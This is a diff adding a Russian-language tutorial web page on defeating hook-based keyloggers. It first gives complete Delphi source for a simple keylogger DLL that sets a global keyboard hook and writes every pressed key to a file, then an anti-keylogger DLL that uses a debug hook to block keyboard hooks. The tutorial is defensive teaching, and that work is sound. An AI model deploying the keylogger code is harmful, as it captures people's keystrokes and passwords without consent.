@@ -1,0 +1,129 @@
+<!--#include virtual="../template1"-->Охота за шпионом, или АнтиКейлоггер<!--#include virtual="../template2"-->
+<!--#include virtual="./menu"-->
+<!--#include virtual="../template3"-->
+
+<h1 align=center>Охота за шпионом, или АнтиКейлоггер</h1>
+
+<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=3352"><i>x2er0</i></a>
+
+<p>Сегодня мы рассмотрим, как с помощью DLL перекрыть кислород обыкновенному KeyLogerr'у, работающему на основе SetWindowsHookEx. Для начала напишем простенький KL:</p>
+<pre class="code">
+library kl;
+
+Uses
+   Windows
+   ,Messages
+   ;
+
+Var
+  hook:HHook = 0;
+
+Procedure WriteLog(const log: PChar);
+ Var
+   hFile: THandle;
+   dwError: DWord;
+   buf: array[0..1] of Char;
+   dwWritten: DWord;
+ Begin
+   hFile := CreateFile(PChar('kl'), GENERIC_WRITE, 0, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+   Try
+     If (hFile <> INVALID_HANDLE_VALUE) Then
+     Begin
+       dwError := SetFilePointer(hFile, 0, nil, FILE_END);
+       If (dwError <> $FFFFFFFF) Then
+       Begin
+          WriteFile(hFile, log^, length(log), dwWritten, nil);
+          buf[0] := #13;
+          buf[1] := #10;
+          WriteFile(hFile, buf, 2, dwWritten, nil);
+       End;
+     End;
+   Finally
+     CloseHandle(hFile);
+   End;
+ End;
+
+Function HookProc(nCode: LongInt; wParam, lParam: LongInt): LongInt stdcall;
+ Var
+   lpszName: Array[0..255] Of Char;
+ Begin
+    If (nCode = HC_ACTION) And ((lParam shr 31) = 1) Then
+    Begin
+
+       GetKeyNameText(lParam, @lpszName, $FF);
+       WriteLog(PChar(@lpszName));
+
+    End;
+    Result := CallNextHookEx(Hook, nCode, wParam, lParam);
+ End;
+
+
+procedure sethook(flag:bool);export; stdcall;
+begin
+ if flag then
+    hook := SetWindowsHookEx(WH_KEYBOARD, @HookProc, hInstance, 0)
+ else
+   begin
+    unhookwindowshookex(hook);
+    hook:=0;
+   end;
+end;
+
+exports sethook;
+
+begin
+end.
+</pre>
+
+<p>Он записывает имена всех нажатых клавиш в указанный файл. Этого достаточно для проверки и написания АнтиКейлоггера.</p>
+<p>Приступим...</p>
+<p>Что будет представлять собой наш AKL? Все просто. Это будет такое же .EXE приложение, устанавливающее Hook с помощью SetWindowsHookEx и использующее DLL. Единственное отличие в том, что хук будет устанавливаться не на WH_KEYBOARD, а на WH_DEBUG. Вот и все.</p>
+<p>Напишем:</p>
+<pre class="code">
+library akl;
+
+Uses
+   Windows
+   ;
+
+Var
+  hook:HHook = 0;
+
+Function DebugProc(nCode: LongInt; wParam, lParam: LongInt): LongInt stdcall;
+Begin
+    If (nCode = HC_ACTION) Then
+    Begin
+
+       If (wParam = WH_KEYBOARD) Then
+       Begin
+          Result := 1;
+          Exit;
+       End;
+
+    End;
+    Result := CallNextHookEx(Hook, nCode, wParam, lParam);
+End;
+
+
+procedure sethook(flag:bool);export; stdcall;
+begin
+ if flag then
+    hook := SetWindowsHookEx(WH_DEBUG, @DebugProc, hInstance, 0)
+ else
+   begin
+    unhookwindowshookex(hook);
+    hook:=0;
+   end;
+end;
+
+exports sethook;
+
+begin
+end.
+</pre>
+
+<p>Особенность в том, что мы, поймав wParam = WH_KEYBOARD, устанавливаем Result := 1 и выходим без передачи управления на другую ловушку (CallNextHookEx).</p>
+<p>Это самые простые КейЛоггер и АнтиКейлоггер. Но я буду рад, если они кому-то пригодятся!</p>
+<p>Удачи!!!</p>
+
+<!--#include virtual="../template4"-->
